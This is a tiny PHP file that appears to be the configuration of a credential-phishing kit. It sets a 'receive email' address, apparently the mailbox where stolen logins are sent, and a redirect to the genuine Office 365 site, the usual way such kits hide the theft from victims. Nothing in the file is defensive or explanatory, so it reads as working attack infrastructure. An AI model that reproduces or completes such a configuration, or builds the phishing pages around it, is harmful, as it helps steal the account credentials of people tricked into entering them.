<?php 
$Receive_email="deafcommission@hotmail.com";
$redirect="https://www.office.com/";
?>